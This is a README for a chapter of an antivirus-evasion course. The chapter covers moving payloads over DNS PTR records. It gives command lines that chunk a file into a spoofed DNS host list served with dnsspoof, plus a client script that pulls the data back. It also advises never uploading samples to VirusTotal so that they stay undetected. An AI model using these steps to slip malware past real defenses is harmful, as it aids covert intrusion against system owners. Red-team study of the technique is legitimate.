# Course : Bypassing Anti Viruses by C#.NET Programming

Part 2 (Infil/Exfiltration/Transferring Techniques by C#)  , Chapter 3 : DATA Transferring / Downloading Method by DNS Traffic (PTR Records)

eBook : Bypassing Anti Viruses by C#.NET Programming

eBook chapter 3 , PDF Download : https://github.com/DamonMohammadbagher/eBook-BypassingAVsByCSharp/tree/master/CH3

Warning :Don't Use "www.virustotal.com" or something like that , Never Ever ;D

Recommended:

STEP 1 : Use each AV one by one in your LAB .

STEP 2 : after "AV Signature Database Updated" your Internet Connection should be "Disconnect" .

STEP 3 : Now you can Copy and Paste your C# code to your Virtual Machine for test .


# using these scripts step by step :

# (Server side)

./DnsHostCreator.sh SourceTextFile.txt DomainName ChunkNumber

./DnsHostCreator.sh text.txt Test.com 20 > myhost.txt

dnsspoof -f myhost.txt

# (Client side)

./NativePayload_DNS.sh DomainName TargetDNSServer delay

./NativePayload_DNS.sh Test.com 192.168.1.10 3
